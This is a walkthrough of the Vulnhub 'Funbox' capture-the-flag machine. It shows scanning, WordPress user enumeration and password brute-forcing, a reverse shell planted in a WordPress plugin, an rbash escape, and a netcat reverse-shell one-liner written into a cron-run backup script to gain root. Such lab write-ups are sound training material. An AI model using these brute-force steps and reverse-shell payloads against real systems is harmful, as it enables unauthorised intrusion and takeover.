# Funbox ~Vulnhub Walkthrough

Here is Walkthrough of Vulnhub Machine Funbox Boot2Root ! This is a reallife szenario, but easy going. You have to enumerate and understand the szenario to get the root-flag in round about 20min.

## Scanning

**nmap -p- 192.168.122.151**

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled.png)

**nmap -sV -A 192.168.122.151**

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%201.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%201.png)

**nmap -sV -A --script vuln 192.168.122.151 (Vulnerability scaning)**

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%202.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%202.png)

Running nikto 

**nikto -h http://192.168.122.151**

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%203.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%203.png)

Adding funbox.fritz.box in /etc/hosts

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%204.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%204.png)

## Enumeration

Open funbox.fritz.box in browser

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%205.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%205.png)

This site is wordpress site. So we'll run wpscan to enumerate username and password

**wpscan --url http://funbox.fritz.box/ -e u**

```jsx
root@kali:~# wpscan --url http://funbox.fritz.box/ -e u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time
[i] Last database update: 2018-08-21
[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > n
[+] URL: http://funbox.fritz.box/
[+] Started: Sun Aug 16 07:07:28 2020

[+] Interesting header: LINK: <http://funbox.fritz.box/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: LINK: <http://funbox.fritz.box/>; rel=shortlink
[+] Interesting header: SERVER: Apache/2.4.41 (Ubuntu)
[+] robots.txt available under: http://funbox.fritz.box/robots.txt   [HTTP 200]
[+] Interesting entry from robots.txt: http://funbox.fritz.box/secret/   [HTTP 200]
[+] XML-RPC Interface available under: http://funbox.fritz.box/xmlrpc.php   [HTTP 405]
[+] Found an RSS Feed: http://funbox.fritz.box/index.php/feed/   [HTTP 200]
[!] Detected 1 user from RSS feed:
+-------+
| Name  |
+-------+
| admin |
+-------+
[!] Upload directory has directory listing enabled: http://funbox.fritz.box/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://funbox.fritz.box/wp-includes/

[+] Enumerating WordPress version ...

[+] WordPress version 5.4.2 

[+] WordPress theme in use: twentyseventeen - v2.3

[+] Name: twentyseventeen - v2.3
 |  Latest version: 1.7 (up to date)
 |  Last updated: 2018-08-02T00:00:00.000Z
 |  Location: http://funbox.fritz.box/wp-content/themes/twentyseventeen/
 |  Readme: http://funbox.fritz.box/wp-content/themes/twentyseventeen/readme.txt
 |  Style URL: http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css
 |  Theme Name: Twenty Seventeen
 |  Theme URI: https://wordpress.org/themes/twentyseventeen/
 |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found passively

[+] Enumerating usernames ...
[+] We identified the following 2 users:
    +----+-------+------------+
    | ID | Login | Name       |
    +----+-------+------------+
    | 1  | admin | admin      |
    | 2  | joe   | joe miller |
    +----+-------+------------+
[!] Default first WordPress username 'admin' is still used

[+] Finished: Sun Aug 16 07:07:35 2020
[+] Elapsed time: 00:00:06
[+] Requests made: 265
[+] Memory used: 31.73 MB
root@kali:~# 
```

Found two users admin and joe

Bruteforcing password using wpscan

**wpscan --url [http://funbox.fritz.box/](http://funbox.fritz.box/) --wordlist /usr/share/seclists/Passowrds/darkweb2017-top10000.txt --username admin**

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%206.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%206.png)

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%207.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%207.png)

admin password: iubire

**wpscan --url [http://funbox.fritz.box/](http://funbox.fritz.box/) --wordlist /usr/share/seclists/Passowrds/darkweb2017-top10000.txt --username joe**

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%208.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%208.png)

joe password: 12345

Login in http://funbox.fritz.box/wp-login.php using admin credential

Editing plugin akismet/akismet.php to take reverse shell

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%209.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%209.png)

Save the edited plugin and access in browser

funbox.fritz.box/wp-content/plugins/akismet/akismet.php

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2010.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2010.png)

Side by side start listener on port 1234

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2011.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2011.png)

Got shell of www-data user

using joe:12345 credential to connect using ssh

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2012.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2012.png)

cd: restricted

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2013.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2013.png)

To escape rbash, connect through ssh using command

**ssh joe@192.168.122.151 -t "bash --norprofile"**

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2014.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2014.png)

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2015.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2015.png)

Found .backup.sh file having full permission to other user in /home/funny directory

Edit file and put reverse shell payload

#!bin/bash 

rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.148 4444 >/tmp/f

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2016.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2016.png)

start listener on port 4444

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2017.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2017.png)

After 4-5 min we got shell of root user.

cd /root 

cat flag.txt

![Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2018.png](Funbox%20~Vulnhub%20Walkthrough%20ac4c9170016f41b39c6c6e0a52f7caef/Untitled%2018.png)
